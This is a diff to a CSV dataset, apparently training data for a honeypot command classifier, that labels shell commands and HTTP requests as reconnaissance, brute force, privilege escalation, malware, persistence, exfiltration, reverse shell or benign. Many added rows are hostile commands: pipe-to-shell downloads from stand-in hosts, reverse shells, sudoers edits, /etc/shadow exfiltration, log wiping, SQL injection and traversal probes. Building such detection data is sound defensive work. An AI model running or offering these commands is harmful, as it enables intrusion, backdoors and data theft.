@@ -83,7 +83,7 @@ sudo /bin/bash,Privilege Escalation
 pkexec --version,Privilege Escalation
 sudo -l,Privilege Escalation
 find / -perm -4000 -type f,Privilege Escalation
-echo "root ALL=(ALL) ALL" >> /etc/sudoers,Privilege Escalation
+"echo ""root ALL=(ALL) ALL"" >> /etc/sudoers",Privilege Escalation
 wget http://evil.com/shell.sh,Malware Attempt
 curl http://evil.com/backdoor,Malware Attempt
 chmod +x /tmp/x,Malware Attempt
@@ -106,7 +106,7 @@ wget -q -O - http://1.2.3.4/bc.sh | sh,Malware Attempt
 curl -s http://1.2.3.4/bot | bash,Malware Attempt
 nohup ./xmrig &,Malware Attempt
 crontab -e,Malware Attempt
-echo "*/5 * * * * curl http://x/sh | sh",Malware Attempt
+"echo ""*/5 * * * * curl http://x/sh | sh""",Malware Attempt
 wget -c http://malware.com/drop,Malware Attempt
 curl -O http://x.com/loader.so,Malware Attempt
 perl -e 'use Socket;',Malware Attempt
@@ -125,6 +125,131 @@ echo test,Benign
 ll,Benign
 dir,Benign
 list,Benign
-echo "hello world",Benign
+"echo ""hello world""",Benign
 date,Benign
 cal,Benign
+ss -tulpn,Reconnaissance
+ip route,Reconnaissance
+ip neigh,Reconnaissance
+arp -a,Reconnaissance
+cat /etc/os-release,Reconnaissance
+ls /var/www,Reconnaissance
+ls /home,Reconnaissance
+find / -perm -4000 -type f,Reconnaissance
+curl http://169.254.169.254/latest/meta-data/,Reconnaissance
+wget -S http://localhost,Reconnaissance
+GET /.env,Reconnaissance
+GET /.git/config,Reconnaissance
+GET /phpmyadmin,Reconnaissance
+GET /server-status,Reconnaissance
+GET /manager/html,Reconnaissance
+GET /wp-login.php,Reconnaissance
+GET /cgi-bin/test.cgi,Reconnaissance
+GET /adminer,Reconnaissance
+GET /actuator/env,Reconnaissance
+GET /api/v1/users,Reconnaissance
+GET /swagger.json,Reconnaissance
+GET /config.php,Reconnaissance
+GET /backup.zip,Reconnaissance
+GET /.DS_Store,Reconnaissance
+GET /robots.txt,Reconnaissance
+HEAD /,Reconnaissance
+USER administrator,Brute Force
+USER support,Brute Force
+USER mysql,Brute Force
+USER pi,Brute Force
+USER ec2-user,Brute Force
+PASS 000000,Brute Force
+PASS letmein,Brute Force
+PASS welcome,Brute Force
+PASS changeme,Brute Force
+PASS P@ssw0rd,Brute Force
+auth:root:123456,Brute Force
+auth:admin:password1,Brute Force
+auth:oracle:oracle,Brute Force
+auth:postgres:postgres,Brute Force
+auth:pi:raspberry,Brute Force
+POST /wp-login.php,Brute Force
+POST /admin/login,Brute Force
+POST /user/login,Brute Force
+hydra -L users.txt -P passwords.txt ssh://host,Brute Force
+ncrack -p 22 --user admin host,Brute Force
+sudo /bin/sh,Privilege Escalation
+sudo -u root bash,Privilege Escalation
+pkexec /bin/sh,Privilege Escalation
+find / -perm -u=s -type f,Privilege Escalation
+cp /bin/bash /tmp/rootbash,Privilege Escalation
+chmod u+s /tmp/rootbash,Privilege Escalation
+echo user ALL=NOPASSWD:ALL >> /etc/sudoers,Privilege Escalation
+"mount -o remount,rw /",Privilege Escalation
+docker run -v /:/host -it alpine chroot /host,Privilege Escalation
+cat /etc/sudoers,Privilege Escalation
+crontab -e,Privilege Escalation
+echo root:pass | chpasswd,Privilege Escalation
+curl http://evil.test/bot.sh | sh,Malware Attempt
+wget http://evil.test/mirai -O /tmp/mirai,Malware Attempt
+chmod +x /tmp/mirai && /tmp/mirai,Malware Attempt
+"python -c import socket,os,pty",Malware Attempt
+bash -i >& /dev/tcp/1.2.3.4/4444 0>&1,Malware Attempt
+busybox wget http://malware.test/x,Malware Attempt
+curl -fsSL http://payload.test/install.sh | bash,Malware Attempt
+tftp -g -r bot 1.2.3.4,Malware Attempt
+perl -e use Socket,Malware Attempt
+rm -rf /tmp/*; wget http://bad/x,Malware Attempt
+echo Y3VybCBiYWQ= | base64 -d | sh,Malware Attempt
+python3 -m http.server 8000,Malware Attempt
+chmod 777 /tmp; cd /tmp; wget http://bad/bot,Malware Attempt
+GET /?id=1 UNION SELECT password FROM users,Web Exploit
+GET /index.php?page=../../../../etc/passwd,Web Exploit
+GET /cgi-bin/../../bin/sh,Web Exploit
+GET /?q=<script>alert(1)</script>,Web Exploit
+POST /upload.php,Web Exploit
+GET /solr/admin/cores,Web Exploit
+GET /jmx-console/HtmlAdaptor,Web Exploit
+GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,Web Exploit
+GET /boaform/admin/formLogin,Web Exploit
+GET /shell?cmd=id,Web Exploit
+GET /wp-admin/admin-ajax.php,Web Exploit
+GET /.aws/credentials,Web Exploit
+GET /config/.env,Web Exploit
+GET /laravel/.env,Web Exploit
+GET /debug/default/view,Web Exploit
+echo * * * * * curl bad|crontab -,Persistence
+crontab -l,Persistence
+echo ssh-rsa AAAA >> ~/.ssh/authorized_keys,Persistence
+mkdir -p ~/.ssh,Persistence
+systemctl enable bad.service,Persistence
+echo payload > /etc/rc.local,Persistence
+curl bad/cron.sh >> /var/spool/cron/root,Persistence
+nohup /tmp/bot &,Persistence
+screen -dmS updater /tmp/bot,Persistence
+tmux new -d /tmp/bot,Persistence
+tar czf /tmp/etc.tgz /etc,Data Exfiltration
+scp /etc/passwd attacker:/tmp/,Data Exfiltration
+curl -F file=@/etc/passwd http://evil/upload,Data Exfiltration
+wget --post-file=/etc/shadow http://evil,Data Exfiltration
+nc 1.2.3.4 9001 < /etc/passwd,Data Exfiltration
+python -m SimpleHTTPServer,Data Exfiltration
+base64 /etc/shadow,Data Exfiltration
+cat /var/log/auth.log,Data Exfiltration
+sqlite3 honeypot.db .dump,Data Exfiltration
+mysqldump --all-databases,Data Exfiltration
+GET /.env,Credential Access
+GET /.git/config,Credential Access
+GET /wp-config.php,Credential Access
+GET /config.php,Credential Access
+GET /backup.sql,Credential Access
+POST /wp-login.php,Credential Stuffing
+POST /admin/login,Credential Stuffing
+POST /phpmyadmin/index.php,Credential Stuffing
+curl http://malicious.example/payload.sh | sh,Malware Download
+wget http://malicious.example/bot -O /tmp/bot,Malware Download
+chmod +x /tmp/bot && /tmp/bot,Malware Execution
+echo ssh-rsa AAAA attacker >> ~/.ssh/authorized_keys,Persistence
+crontab -l; echo "* * * * * /tmp/bot" | crontab -,Persistence
+iptables -F,Defense Evasion
+rm -rf /var/log/*,Defense Evasion
+python -c "import socket,os,pty; s=socket.socket()",Reverse Shell
+bash -i >& /dev/tcp/203.0.113.10/4444 0>&1,Reverse Shell
+nc -e /bin/sh 203.0.113.10 4444,Reverse Shell
+find / -perm -4000 -type f 2>/dev/null,Privilege Escalation
